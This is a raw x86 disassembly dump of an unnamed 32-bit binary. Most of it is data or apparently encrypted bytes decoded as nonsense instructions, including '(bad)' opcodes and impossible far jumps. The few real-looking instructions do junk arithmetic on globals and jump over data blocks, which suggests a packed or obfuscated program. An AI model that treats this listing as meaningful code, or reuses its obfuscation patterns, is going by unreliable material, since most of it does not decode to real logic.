  4099a0:	jb     0x409a1f
  4099a2:	and    ebx,DWORD PTR [ecx]
  4099a4:	dec    ecx
  4099a5:	cmp    al,0xe0
  4099a7:	aaa    
  4099a8:	popa   
  4099a9:	out    0x78,al
  4099ab:	lods   eax,DWORD PTR ds:[esi]
  4099ac:	std    
  4099ad:	ror    DWORD PTR [ebp+edi*2+0x48],1
  4099b1:	lds    edi,FWORD PTR [esi+0x68]
  4099b4:	sub    BYTE PTR [edx-0x73],dh
  4099b7:	add    dh,BYTE PTR [ecx+0x28]
  4099ba:	int    0x8b
  4099bc:	outs   dx,BYTE PTR ds:[esi]
  4099bd:	sub    esp,esi
  4099bf:	out    dx,al
  4099c0:	rol    DWORD PTR [ebp+0x1],1
  4099c3:	or     BYTE PTR [edi+0x5e],bl
  4099c6:	pop    ebx
  4099c7:	leave  
  4099c8:	ret    
  4099c9:	push   ebp
  4099ca:	mov    ebp,esp
  4099cc:	sub    esp,0x44
  4099cf:	push   edi
  4099d0:	sub    DWORD PTR ds:0x42fe8a,0x50c
  4099da:	mov    eax,DWORD PTR [ebp+0xc]
  4099dd:	sbb    DWORD PTR ds:0x42e21c,edx
  4099e3:	mov    DWORD PTR [ebp-0x10],eax
  4099e6:	mov    eax,ds:0x42e397
  4099eb:	mov    edi,DWORD PTR ds:0x42e3a7
  4099f1:	sub    eax,edi
  4099f3:	imul   eax,DWORD PTR [eax+edi*1]
  4099f7:	mov    eax,DWORD PTR [ebp+0x8]
  4099fa:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  409a01:	neg    edx
  409a03:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  409a0a:	mov    edi,DWORD PTR ds:0x42e89c
  409a10:	mov    edi,DWORD PTR [edi]
  409a12:	or     DWORD PTR ds:0x42e224,edi
  409a18:	mov    edx,DWORD PTR [ebp+0x8]
  409a1b:	add    edi,0x5c8e
  409a21:	mov    DWORD PTR [ebp-0x40],eax
  409a24:	adc    DWORD PTR ds:0x42fdf9,0x342b
  409a2e:	mov    eax,0x7510855
  409a33:	xor    edi,ecx
  409a35:	xor    edx,eax
  409a37:	mov    edi,DWORD PTR ds:0x42e21c
  409a3d:	sbb    DWORD PTR ds:0x42e7eb,edi
  409a43:	mov    ecx,0x32729c
  409a48:	jmp    0x409e06
  409a4d:	arpl   WORD PTR [edx-0x6f],si
  409a50:	cmc    
  409a51:	xchg   ecx,eax
  409a52:	cmc    
  409a53:	arpl   WORD PTR [edx-0x1f],si
  409a56:	pop    ebp
  409a57:	das    
  409a58:	imul   ecx
  409a5a:	repz push edi
  409a5c:	ss xchg esp,ebp
  409a5f:	jo     0x409ad1
  409a61:	lahf   
  409a62:	jge    0x409ad4
  409a64:	jo     0x409a38
  409a66:	imul   ebp,DWORD PTR [esp+ebp*4],0xa83d0919
  409a6d:	cmp    eax,0x5c1134d8
  409a72:	inc    eax
  409a73:	stc    
  409a74:	mov    ch,bh
  409a76:	out    0xcb,eax
  409a78:	int3   
  409a79:	lea    esi,[edx]
  409a7b:	push   es
  409a7c:	popa   
  409a7d:	sbb    al,0xb1
  409a7f:	imul   BYTE PTR [esi]
  409a81:	sar    BYTE PTR [esi],cl
  409a83:	in     al,0x7e
  409a85:	retf   
  409a86:	mov    eax,ds:0x1620651f
  409a8b:	shl    al,0x91
  409a8e:	ins    DWORD PTR es:[edi],dx
  409a8f:	mov    esi,0x94600851
  409a94:	jl     0x409a2e
  409a96:	icebp  
  409a97:	sbb    al,dl
  409a99:	js     0x409acf
  409a9b:	mov    dh,0x8d
  409a9d:	ss call 0x5151d219
  409aa3:	cmp    DWORD PTR [esi-0x4b57cb5a],0xbd2eba57
  409aad:	jecxz  0x409b26
  409aaf:	mov    ebx,0xe23f6e46
  409ab4:	out    dx,eax
  409ab5:	call   0x31ea838c
  409aba:	jle    0x409aa5
  409abc:	jg     0x409a3f
  409abe:	push   ds
  409abf:	push   ebx
  409ac0:	xchg   ebx,eax
  409ac1:	ss into 
  409ac3:	repz sub cl,BYTE PTR [esp-0x26a3826]
  409acb:	hlt    
  409acc:	ja     0x409aa2
  409ace:	dec    ebp
  409acf:	jecxz  0x409b38
  409ad1:	jge    0x409b33
  409ad3:	leave  
  409ad4:	xchg   edi,eax
  409ad5:	jp     0x409a6d
  409ad7:	pop    edi
  409ad8:	mov    ebp,ecx
  409ada:	pop    ds
  409adb:	xchg   BYTE PTR [ecx],bl
  409add:	mov    eax,ds:0x12f1aff7
  409ae2:	dec    esi
  409ae3:	pushf  
  409ae4:	or     dl,BYTE PTR [edx+ebp*8-0x67]
  409ae8:	clc    
  409ae9:	xchg   esp,eax
  409aea:	xchg   ebp,eax
  409aeb:	pop    edx
  409aec:	rcr    DWORD PTR [ebp-0x13],cl
  409aef:	(bad)  
  409af0:	xchg   ebp,eax
  409af1:	adc    eax,ebx
  409af3:	jg     0x409b39
  409af5:	xchg   esi,eax
  409af6:	inc    ebx
  409af7:	fisub  WORD PTR [ecx-0x1184204a]
  409afd:	dec    eax
  409afe:	xchg   edi,eax
  409aff:	int    0x80
  409b01:	out    0xb4,al
  409b03:	pushf  
  409b04:	xchg   ecx,eax
  409b05:	lea    ecx,[ebx+ebx*4+0x1d]
  409b09:	das    
  409b0a:	fimul  WORD PTR [edi]
  409b0c:	jb     0x409ab4
  409b0e:	mov    edi,0x2b7104d1
  409b13:	push   ds
  409b14:	pushf  
  409b15:	jne    0x409b7e
  409b17:	and    al,0xf3
  409b19:	iret   
  409b1a:	stc    
  409b1b:	into   
  409b1c:	push   es
  409b1d:	inc    eax
  409b1e:	js     0x409b69
  409b20:	ja     0x409b94
  409b22:	aas    
  409b23:	arpl   WORD PTR [esi-0x48],cx
  409b26:	inc    edi
  409b27:	data16 sti 
  409b29:	xchg   ebx,eax
  409b2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b2c:	aad    0xf0
  409b2e:	dec    ecx
  409b2f:	jle    0x409ad9
  409b31:	dec    ebp
  409b32:	adc    BYTE PTR [edi],bl
  409b34:	lahf   
  409b35:	inc    esi
  409b36:	or     ebx,DWORD PTR [esi-0x68]
  409b39:	inc    ebx
  409b3a:	popa   
  409b3b:	adc    eax,0x51713915
  409b40:	test   eax,0x43c4d63c
  409b45:	or     edx,edi
  409b47:	sub    bl,BYTE PTR [eax-0x326219a8]
  409b4d:	retf   
  409b4e:	aas    
  409b4f:	cmp    cl,BYTE PTR [edx]
  409b51:	push   ds
  409b52:	jle    0x409afb
  409b54:	mov    ds:0xc86cf72,al
  409b59:	into   
  409b5a:	loopne 0x409af7
  409b5c:	fmul   DWORD PTR [esi]
  409b5e:	push   ebp
  409b5f:	outs   dx,DWORD PTR ds:[esi]
  409b60:	mov    eax,0x211e32c5
  409b65:	cvtps2pd xmm3,xmm2
  409b68:	lahf   
  409b69:	cmp    esi,DWORD PTR [edi+0x5bec5dbf]
  409b6f:	push   eax
  409b70:	(bad)  
  409b71:	mov    edx,0x648d4ceb
  409b76:	adc    al,0xd4
  409b78:	in     al,0xe8
  409b7a:	cdq    
  409b7b:	enter  0x3fb8,0xa5
  409b7f:	test   edi,edi
  409b81:	push   ebx
  409b82:	pop    es
  409b83:	bswap  esi
  409b85:	sti    
  409b86:	imul   edx,DWORD PTR [esi+0x2aad95aa],0x25
  409b8d:	js     0x409b63
  409b8f:	sti    
  409b90:	addr16 stc 
  409b92:	and    BYTE PTR [ecx+0x61],ah
  409b95:	xlat   BYTE PTR ds:[ebx]
  409b96:	addr16 in al,dx
  409b98:	imul   cl
  409b9a:	add    al,0x16
  409b9c:	mov    esp,0xfd200657
  409ba1:	mov    ecx,0xd87a67e6
  409ba6:	sbb    ecx,DWORD PTR [ebp+0x66]
  409ba9:	pop    ds
  409baa:	push   ss
  409bab:	imul   ebx,DWORD PTR [eax+0x25158d5f],0x994422d
  409bb5:	ror    BYTE PTR [edi+0x57],0x7e
  409bb9:	jo     0x409b44
  409bbb:	xlat   BYTE PTR ds:[ebx]
  409bbc:	clc    
  409bbd:	inc    ecx
  409bbe:	jmp    FWORD PTR [esi+ebp*1]
  409bc1:	lahf   
  409bc2:	cmp    edi,esi
  409bc4:	icebp  
  409bc5:	push   ds
  409bc6:	jo     0x409bb7
  409bc8:	lds    esp,FWORD PTR [ebp-0x44]
  409bcb:	adc    al,BYTE PTR [ebx-0x7d]
  409bce:	gs xchg esp,eax
  409bd0:	and    ecx,eax
  409bd2:	ins    BYTE PTR es:[edi],dx
  409bd3:	test   eax,0xfe066857
  409bd8:	xchg   ebp,eax
  409bd9:	dec    ebx
  409bda:	xchg   edi,eax
  409bdb:	mov    ecx,0xe27b14b9
  409be0:	shl    DWORD PTR [eax-0x5d0ce6ce],0xfe
  409be7:	push   edx
  409be8:	cmp    DWORD PTR ds:0x25bfcdb0,0x19
  409bef:	fld    QWORD PTR [ecx+0xc]
  409bf2:	loope  0x409c56
  409bf4:	into   
  409bf5:	(bad)  
  409bf6:	sbb    al,0xb0
  409bf8:	cmp    BYTE PTR [ebx+0xf],cl
  409bfb:	xor    al,0xe1
  409bfd:	ds mov edi,0x54abac0b
  409c03:	adc    bl,BYTE PTR fs:[ebx+0x37fd2a9]
  409c0a:	out    dx,al
  409c0b:	into   
  409c0c:	mov    dh,0x70
  409c0e:	push   eax
  409c0f:	push   esp
  409c10:	xchg   esp,eax
  409c11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c13:	push   0x8c4404a4
  409c18:	pop    esp
  409c19:	inc    esi
  409c1a:	test   al,0xef
  409c1c:	jl     0x409bf5
  409c1e:	into   
  409c1f:	mov    ch,0x97
  409c21:	sub    edi,ebp
  409c23:	sbb    bh,ah
  409c25:	sbb    esp,DWORD PTR [edx-0x56]
  409c28:	mov    ebp,DWORD PTR [esi]
  409c2a:	lods   al,BYTE PTR ds:[esi]
  409c2b:	mov    BYTE PTR [eax+0x1b],bh
  409c2e:	popf   
  409c2f:	sbb    eax,ebx
  409c31:	popa   
  409c32:	dec    esi
  409c33:	push   0x1721b908
  409c38:	mov    BYTE PTR [ebx-0x3d],bh
  409c3b:	adc    al,0x52
  409c3d:	mov    ds:0xa7365168,al
  409c42:	jb     0x409c83
  409c44:	jl     0x409c09
  409c46:	bound  edx,QWORD PTR [esi+0x6d]
  409c49:	shl    dl,cl
  409c4b:	push   bp
  409c4d:	int    0x8b
  409c4f:	fstp   QWORD PTR [edi+0x7987720a]
  409c55:	aam    0xa7
  409c57:	xor    DWORD PTR [edi+0x76],esp
  409c5a:	adc    DWORD PTR ds:0x10fddc73,ecx
  409c60:	xchg   edx,eax
  409c61:	push   cs
  409c62:	xor    BYTE PTR [ebx],bh
  409c64:	cwde   
  409c65:	mov    ah,0x8e
  409c67:	sbb    BYTE PTR [edi+0x53f76ea5],al
  409c6d:	jmp    0xebf1ad87
  409c72:	jp     0x409c7a
  409c74:	std    
  409c75:	add    ebx,DWORD PTR [edi+0x33]
  409c78:	jnp    0x409c75
  409c7a:	push   ss
  409c7b:	gs mov bh,cl
  409c7e:	popf   
  409c7f:	dec    ebx
  409c80:	or     ecx,esi
  409c82:	fsub   DWORD PTR [ebx-0xe61a30d]
  409c88:	jl     0x409c6d
  409c8a:	pop    ss
  409c8b:	imul   ecx,DWORD PTR [ecx+0xa],0x54
  409c8f:	out    0xd6,al
  409c91:	jge    0x409cf0
  409c93:	xchg   edi,eax
  409c94:	dec    sp
  409c96:	aas    
  409c97:	inc    ebx
  409c98:	aas    
  409c99:	push   cs
  409c9a:	push   es
  409c9b:	push   ecx
  409c9c:	fdiv   st,st(3)
  409c9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c9f:	ins    BYTE PTR es:[edi],dx
  409ca0:	sub    DWORD PTR [ebx],edx
  409ca2:	(bad)  
  409ca3:	ins    BYTE PTR es:[edi],dx
  409ca4:	arpl   WORD PTR [eax+0x9a8fe32],dx
  409caa:	dec    esp
  409cab:	scas   al,BYTE PTR es:[edi]
  409cac:	jb     0x409c8b
  409cae:	hlt    
  409caf:	or     al,0x89
  409cb1:	mov    ch,0x1
  409cb3:	pop    edx
  409cb4:	adc    ecx,ebx
  409cb6:	add    BYTE PTR [ecx-0x5bf5564f],al
  409cbc:	dec    eax
  409cbd:	sub    eax,0x6597b2aa
  409cc2:	adc    cl,dh
  409cc4:	mov    ecx,0x97f033d9
  409cc9:	repz lahf 
  409ccb:	aad    0xe9
  409ccd:	mov    WORD PTR ds:0x862aab5d,?
  409cd3:	cmp    ax,0xb4c4
  409cd7:	jmp    0x55e2:0x458d4947
  409cde:	mov    eax,ds:0xfd338488
  409ce3:	mov    ecx,0x536c57b0
  409ce8:	sub    al,0xdd
  409cea:	int    0xe9
  409cec:	sbb    DWORD PTR [ebx],esp
  409cee:	add    bl,BYTE PTR [esi+0x5]
  409cf1:	sahf   
  409cf2:	ss mov al,0xa9
  409cf5:	jo     0x409c9d
  409cf7:	stos   BYTE PTR es:[edi],al
  409cf8:	mov    al,0x41
  409cfa:	dec    edi
  409cfb:	imul   ebx,DWORD PTR [ebp-0x38],0xffffff9d
  409cff:	outs   dx,BYTE PTR ds:[esi]
  409d00:	or     BYTE PTR [edi-0x7f],bh
  409d03:	push   0x2004472d
  409d08:	sar    DWORD PTR [eax],cl
  409d0a:	repz sbb dh,BYTE PTR ds:[ebx+ebp*1]
  409d0f:	mov    ecx,ss
  409d11:	jecxz  0x409d24
  409d13:	cmp    DWORD PTR [edx+0x24],ebp
  409d16:	hlt    
  409d17:	es inc esp
  409d19:	mov    BYTE PTR [ebp-0x37e9f3d7],cl
  409d1f:	mov    ebp,0xb85dd530
  409d24:	mov    eax,ds:0x3d0dfd50
  409d29:	int    0x56
  409d2b:	sahf   
  409d2c:	iret   
  409d2d:	idiv   ch
  409d2f:	adc    ah,BYTE PTR [esi+eiz*2-0x46]
  409d33:	test   DWORD PTR [edx-0x6b],esp
  409d36:	ja     0x409cfd
  409d38:	les    edi,FWORD PTR [ecx+eiz*4]
  409d3b:	sub    eax,0xaa2c7f2a
  409d40:	sub    eax,0x256a6977
  409d45:	xchg   esp,eax
  409d46:	rol    DWORD PTR [esi],1
  409d48:	sbb    al,0x70
  409d4b:	adc    dh,BYTE PTR [eax+0x5cf33055]
  409d51:	add    BYTE PTR [ebp-0x36ef4aa0],dl
  409d57:	ss jbe 0x409d97
  409d5a:	dec    edx
  409d5b:	add    bh,BYTE PTR [esi-0x6e]
  409d5e:	jbe    0x409d63
  409d60:	aam    0xc3
  409d62:	cs pop esi
  409d64:	(bad)  
  409d65:	push   ebp
  409d66:	into   
  409d67:	adc    BYTE PTR [ecx+0x65],ch
  409d6a:	push   ds
  409d6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d6c:	or     al,0x85
  409d6e:	add    dh,BYTE PTR [esi+0x2]
  409d71:	aam    0xec
  409d73:	neg    BYTE PTR [esi+0x5b]
  409d76:	xor    BYTE PTR [ebx-0x44471bb8],0xf5
  409d7d:	fistp  DWORD PTR [edx-0x4701947d]
  409d83:	sub    ebx,esi
  409d85:	adc    DWORD PTR [esi-0x5f],ebp
  409d88:	fwait
  409d89:	jno    0x409dd1
  409d8b:	in     eax,dx
  409d8c:	fidiv  DWORD PTR [eax+0x6eed7560]
  409d92:	scas   al,BYTE PTR es:[edi]
  409d93:	cmp    eax,0x28bf06ef
  409d98:	mov    ds:0x5e7ba4cd,al
  409d9d:	imul   eax,DWORD PTR [ebp-0x3f],0x34b9e864
  409da4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409da5:	add    edx,DWORD PTR [eax+edx*2+0x1d12739a]
  409dac:	cli    
  409dad:	jp     0x409d42
  409daf:	test   BYTE PTR [edi+0x1f],ch
  409db2:	clc    
  409db3:	dec    esp
  409db4:	mov    BYTE PTR [ebx+0x18bafa97],bl
  409dba:	adc    edi,DWORD PTR [ebx+ebp*8+0x66]
  409dbe:	or     ebp,esi
  409dc0:	sbb    DWORD PTR [ebp+0x138d7348],eax
  409dc6:	adc    dl,BYTE PTR [edi+0x378b0266]
  409dcc:	loopne 0x409e18
  409dce:	jae    0x409db6
  409dd0:	jmp    0x6d44:0xe52f00d7
  409dd7:	pop    ecx
  409dd8:	jns    0x409db7
  409dda:	cmp    BYTE PTR [ecx+0x35],0xe4
  409dde:	add    DWORD PTR [edx],esp
  409de0:	jae    0x409dfe
  409de2:	cs mov esi,0x4f97027f
  409de8:	mov    al,0x85
  409dea:	mov    ds:0xde8d788b,al
  409def:	lock inc ebx
  409df1:	sbb    DWORD PTR [ebx],ebx
  409df3:	dec    ebx
  409df4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409df5:	pop    ebx
  409df6:	fbld   TBYTE PTR [edi]
  409df8:	dec    esp
  409df9:	(bad)  
  409dfb:	xor    DWORD PTR [ecx],edx
  409dfd:	scas   al,BYTE PTR es:[edi]
  409dfe:	xchg   ebp,eax
  409dff:	push   0xfffffff5
  409e01:	outs   dx,DWORD PTR ds:[esi]
  409e02:	push   ss
  409e03:	ret    
  409e04:	int3   
  409e05:	lods   al,BYTE PTR ds:[esi]
  409e06:	add    edx,ecx
  409e08:	xor    DWORD PTR ds:0x42fe8a,ecx
  409e0e:	mov    DWORD PTR [ebp-0x8],edx
  409e11:	mov    edx,DWORD PTR [ebp+0x8]
  409e14:	and    edi,DWORD PTR ds:0x42fdf9
  409e1a:	xor    edx,eax
  409e1c:	adc    edi,DWORD PTR ds:0x42e224
  409e22:	add    edx,ecx
  409e24:	mov    DWORD PTR ds:0x42fe82,0x18
  409e2e:	cmp    DWORD PTR ds:0x42fe82,0x0
  409e35:	je     0x409e63
  409e3b:	cmp    DWORD PTR ds:0x42fe82,0x1a
  409e42:	jne    0x409e51
  409e48:	push   DWORD PTR [ebp-0xc]
  409e4b:	call   DWORD PTR ds:0x42e3e3
  409e51:	mov    edi,DWORD PTR ds:0x42fe82
  409e57:	dec    edi
  409e58:	mov    DWORD PTR ds:0x42fe82,edi
  409e5e:	jmp    0x409e2e
  409e63:	mov    DWORD PTR [ebp+0xc],edx
  409e66:	adc    DWORD PTR ds:0x42e803,0x3e25
  409e70:	jmp    0x40a22e
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	mov    edi,0x699269fa
  409e7b:	mul    DWORD PTR [ecx-0x79]
  409e7e:	mov    dh,0xc4
  409e80:	(bad)  
  409e81:	dec    ebp
  409e83:	aam    0x9b
  409e85:	es call 0x7de00efb
  409e8b:	jo     0x409efd
  409e8d:	aas    
  409e8e:	test   BYTE PTR [ecx-0x35],dl
  409e91:	out    dx,eax
  409e92:	inc    ecx
  409e93:	mov    bl,0xf8
  409e95:	stos   DWORD PTR es:[edi],eax
  409e96:	jae    0x409e78
  409e98:	sub    bh,cl
  409e9a:	or     bl,al
  409e9c:	push   esp
  409e9d:	(bad)  
  409e9e:	leave  
  409e9f:	ja     0x409e44
  409ea1:	pusha  
  409ea2:	pop    ecx
  409ea3:	lods   eax,DWORD PTR ds:[esi]
  409ea4:	repz sbb edi,DWORD PTR [ebx+0x6a]
  409ea8:	pop    eax
  409ea9:	adc    dh,BYTE PTR [ebx]
  409eab:	xor    BYTE PTR [eax+0x5f],ah
  409eae:	mov    WORD PTR [ecx+0x20],?
  409eb1:	daa    
  409eb2:	mov    eax,0x495893cf
  409eb7:	fdivp  st(4),st
  409eb9:	outs   dx,BYTE PTR ds:[esi]
  409eba:	cvtdq2ps xmm6,XMMWORD PTR [ebp+0x12f548e0]
  409ec1:	and    DWORD PTR ds:0x21ab8afb,ebp
  409ec7:	mov    bl,0xf8
  409ec9:	jae    0x409f10
  409ecb:	je     0x409ea4
  409ecd:	pop    eax
  409ece:	inc    edi
  409ecf:	fimul  WORD PTR [ecx+0x570ee2c]
  409ed5:	(bad)  
  409ed6:	push   eax
  409ed7:	mov    bh,0xbd
  409ed9:	xor    al,0xde
  409edb:	xchg   edi,eax
  409edc:	je     0x409edc
  409ede:	jp     0x409ee1
  409ee0:	jmp    0x409f33
  409ee2:	(bad)  
  409ee4:	lahf   
  409ee5:	inc    esi
  409ee6:	test   ch,0x65
  409ee9:	in     al,dx
  409eea:	xchg   ebx,eax
  409eeb:	cmc    
  409eec:	cmp    al,0x62
  409eee:	cwde   
  409eef:	popf   
  409ef0:	lods   eax,DWORD PTR ds:[esi]
  409ef1:	lods   al,BYTE PTR ds:[esi]
  409ef2:	sub    BYTE PTR [eax+0x7bc54ffe],cl
  409ef8:	ja     0x409e7c
  409efa:	call   0x272e:0x61af2238
  409f01:	call   0x83e3af3
  409f06:	jne    0x409f31
  409f08:	dec    ecx
  409f09:	mov    esp,0x8a94b41e
  409f0e:	lods   al,BYTE PTR ds:[esi]
  409f0f:	xor    DWORD PTR [edi],0xffffffc1
  409f12:	cmp    BYTE PTR [eax+ebp*4],0xb1
  409f16:	cmp    al,0x6d
  409f18:	sbb    al,0x46
  409f1a:	loopne 0x409f5e
  409f1c:	xlat   BYTE PTR ds:[ebx]
  409f1d:	add    BYTE PTR [edx-0x5b],dh
  409f20:	in     eax,0xb7
  409f22:	dec    ebx
  409f23:	sub    dh,dl
  409f25:	jo     0x409f06
  409f27:	popa   
  409f28:	in     al,dx
  409f29:	pop    edx
  409f2a:	ja     0x409f9a
  409f2c:	fld    TBYTE PTR [esp+esi*1+0x2210115a]
  409f33:	(bad)  
  409f35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f36:	bound  ebp,QWORD PTR [edx-0x5946d052]
  409f3c:	mov    cl,0x8a
  409f3e:	hlt    
  409f3f:	or     esp,DWORD PTR [eax]
  409f41:	cdq    
  409f42:	enterw 0x7246,0xd9
  409f47:	cmp    ch,BYTE PTR [eax-0x42]
  409f4a:	(bad)
  409f4d:	inc    ecx
  409f4e:	not    BYTE PTR [eax+0x44792d49]
  409f54:	jmp    0xcd52e283
  409f59:	xor    BYTE PTR [eax+0x35e6d674],bl
  409f5f:	mov    eax,ebx
  409f61:	jbe    0x409fd7
  409f63:	dec    eax
  409f64:	sub    BYTE PTR [esi+0x69eb9760],ch
  409f6a:	inc    edx
  409f6b:	shl    DWORD PTR [edi],1
  409f6d:	add    cl,bl
  409f6f:	pop    eax
  409f70:	ret    
  409f71:	push   edx
  409f72:	adc    esp,esi
  409f74:	pop    ecx
  409f75:	sub    BYTE PTR [ebp+0x17],bl
  409f78:	sti    
  409f79:	test   al,0x3e
  409f7b:	int    0x38
  409f7d:	in     eax,0x6b
  409f7f:	mov    fs,WORD PTR ds:0x634e6a5a
  409f85:	or     al,0x6f
  409f87:	mov    edi,0xaaf3c260
  409f8c:	mov    edx,DWORD PTR [edi]
  409f8e:	neg    BYTE PTR [ebx+0x51a24f77]
  409f94:	arpl   WORD PTR [ebx-0x75],si
  409f97:	loope  0x409f57
  409f99:	jge    0x409f7a
  409f9b:	mov    eax,0x46be5dcb
  409fa0:	arpl   WORD PTR [esp+esi*2],sp
  409fa3:	mul    BYTE PTR [edi+0x7f]
  409fa6:	xchg   ebp,eax
  409fa7:	pop    ecx
  409fa8:	pop    ds
  409fa9:	out    0x5,eax
  409fab:	dec    esi
  409fac:	or     al,0x1e
  409fae:	fcom   st(1)
  409fb0:	inc    ecx
  409fb1:	adc    BYTE PTR [edi],bh
  409fb3:	retf   
  409fb4:	sbb    ebx,esp
  409fb6:	inc    ecx
  409fb7:	loopne 0x40a000
  409fb9:	sbb    ecx,ecx
  409fbb:	and    bl,BYTE PTR [ecx+ebp*8]
  409fbe:	leave  
  409fbf:	mov    al,0x29
  409fc1:	dec    eax
  409fc2:	sub    edx,DWORD PTR [edi-0x1d83218c]
  409fc8:	pop    ebp
  409fc9:	shl    DWORD PTR [edx-0x6dc958ae],cl
  409fcf:	and    BYTE PTR [edx+0x53],0x75
  409fd3:	inc    ecx
  409fd4:	mov    BYTE PTR ds:0xafca70fb,bh
  409fda:	jo     0x409fc2
  409fdc:	xor    esi,0xe121d213
  409fe2:	out    dx,al
  409fe3:	outs   dx,BYTE PTR ds:[esi]
  409fe4:	sti    
  409fe5:	dec    esi
  409fe6:	imul   esp,DWORD PTR [eax+0x1267777a],0x38d18410
  409ff0:	jmp    0x8c42:0xe3cd39c3
  409ff7:	push   ebp
  409ff8:	in     eax,dx
  409ff9:	or     DWORD PTR ds:0x1b48d8db,ecx
  409fff:	ret    0xd3bb
  40a002:	mov    ch,0xf
  40a004:	xor    DWORD PTR [ebp+0x5fa3acfb],eax
  40a00a:	xchg   edx,eax
  40a00b:	leave  
  40a00c:	aam    0x48
  40a00e:	test   al,0xaf
  40a010:	inc    ebp
  40a011:	idiv   DWORD PTR [esi-0xb]
  40a014:	push   ebp
  40a015:	lea    edi,[edi+eax*1]
  40a018:	aas    
  40a019:	xchg   BYTE PTR [ebx],cl
  40a01b:	mov    ds:0xde774439,eax
  40a020:	xor    edx,eax
  40a022:	out    0x73,eax
  40a024:	inc    esp
  40a025:	cs ins DWORD PTR es:[edi],dx
  40a027:	fldln2 
  40a029:	xor    edx,DWORD PTR [edi-0x7b]
  40a02c:	scas   al,BYTE PTR es:[edi]
  40a02d:	sub    al,BYTE PTR [eax+0x1e]
  40a030:	xchg   esi,eax
  40a031:	or     dl,BYTE PTR [esi+0x7ddad2ae]
  40a037:	push   0xfffffff7
  40a039:	jo     0x40a012
  40a03b:	daa    
  40a03c:	jnp    0x40a052
  40a03e:	mov    esp,0xacfd912f
  40a043:	daa    
  40a044:	and    al,0x16
  40a046:	pop    ebx
  40a047:	mov    cl,0xbb
  40a049:	sbb    DWORD PTR [edi],0x7
  40a04c:	cmp    DWORD PTR ds:[eax],esi
  40a04f:	or     al,0xef
  40a051:	popa   
  40a052:	ins    DWORD PTR es:[edi],dx
  40a053:	stc    
  40a054:	rol    edi,cl
  40a056:	cmp    esp,DWORD PTR [ebp+esi*2-0xb]
  40a05a:	adc    DWORD PTR [esi+0x6b22a70c],esi
  40a060:	int3   
  40a061:	data16 cmp BYTE PTR [esi+0xb3208c7],cl
  40a068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a069:	in     eax,dx
  40a06a:	xchg   ebx,eax
  40a06b:	push   esi
  40a06c:	imul   ebp,DWORD PTR [ebx-0x2791cff6],0xe3dfd50d
  40a076:	jo     0x40a030
  40a078:	adc    bh,BYTE PTR [esi-0x749d5574]
  40a07e:	add    eax,DWORD PTR [ecx+0xb]
  40a081:	scas   eax,DWORD PTR es:[edi]
  40a082:	daa    
  40a083:	cwde   
  40a084:	call   0x97d0d51a
  40a089:	push   ecx
  40a08a:	jge    0x40a00f
  40a08c:	push   ds
  40a08d:	mov    esi,0x1dd7f1ec
  40a092:	mov    ebp,0xbecbb55e
  40a097:	jle    0x40a10e
  40a099:	xor    BYTE PTR [eax-0x36],0x30
  40a09d:	call   0xf332:0xa7da59c
  40a0a4:	sbb    DWORD PTR [ebx],ebp
  40a0a6:	shr    BYTE PTR [edx+eiz*4+0x6e],1
  40a0aa:	cld    
  40a0ab:	sub    esi,DWORD PTR [edi]
  40a0ad:	and    BYTE PTR [esi+0x32bb3b2f],dh
  40a0b3:	xchg   BYTE PTR [eax],ah
  40a0b5:	adc    al,0x8d
  40a0b7:	push   eax
  40a0b8:	repnz mov cl,0x2b
  40a0bb:	and    eax,0x795cb65f
  40a0c0:	push   ds
  40a0c1:	mov    esp,DWORD PTR [esi+0x47]
  40a0c4:	cld    
  40a0c5:	imul   edi,DWORD PTR [ecx-0x2],0xc6d5b05c
  40a0cc:	fimul  DWORD PTR [edi]
  40a0ce:	mov    DWORD PTR [eax-0x1b],ecx
  40a0d1:	mov    edx,0x3d2fd7de
  40a0d6:	pop    esi
  40a0d7:	sbb    eax,0x20384335
  40a0dc:	movsx  esi,WORD PTR [eax+0x2e]
  40a0e0:	mov    ebp,edi
  40a0e2:	imul   edi,DWORD PTR [ebp+0x38ffb69e],0xc2c51d55
  40a0ec:	xor    esp,ebp
  40a0ee:	in     al,0xe9
  40a0f0:	inc    eax
  40a0f1:	xchg   esi,eax
  40a0f2:	daa    
  40a0f3:	dec    ebp
  40a0f4:	ret    0x7e1a
  40a0f7:	xor    eax,0xab946656
  40a0fc:	mov    BYTE PTR [esi],dh
  40a0fe:	repnz mov cs,WORD PTR [eax-0x4]
  40a102:	pop    ds
  40a103:	(bad)  
  40a104:	nop
  40a105:	push   0xfffffff0
  40a107:	and    BYTE PTR [eax+0x5],ah
  40a10a:	inc    eax
  40a10b:	in     al,dx
  40a10c:	xchg   edx,eax
  40a10d:	leave  
  40a10e:	int    0x55
  40a110:	in     eax,dx
  40a111:	jmp    0x73e91e8f
  40a116:	and    BYTE PTR [esi-0x9],cl
  40a119:	iret   
  40a11a:	mov    bh,0x8a
  40a11c:	rcpps  xmm6,xmm6
  40a11f:	jns    0x40a17f
  40a121:	sbb    DWORD PTR [eax-0x5e],0x2b573dc0
  40a128:	and    ch,BYTE PTR [esi]
  40a12a:	lock dec ecx
  40a12c:	imul   esi,DWORD PTR [ecx-0x184399da],0x8500cb3
  40a136:	mov    ds,WORD PTR [edx+eiz*8-0x2]
  40a13a:	add    edx,DWORD PTR [esi]
  40a13c:	xchg   ebp,eax
  40a13d:	lea    esp,[eax-0x3904dc8f]
  40a143:	xchg   ebx,eax
  40a144:	pusha  
  40a145:	pushf  
  40a146:	pop    ecx
  40a147:	mov    cl,0x33
  40a149:	dec    eax
  40a14a:	repnz enter 0x333c,0x79
  40a14f:	push   ecx
  40a150:	sahf   
  40a151:	inc    eax
  40a152:	sahf   
  40a153:	add    ecx,DWORD PTR [ebx]
  40a155:	jmp    DWORD PTR [eax+0x20]
  40a158:	pushf  
  40a159:	aas    
  40a15a:	ja     0x40a15f
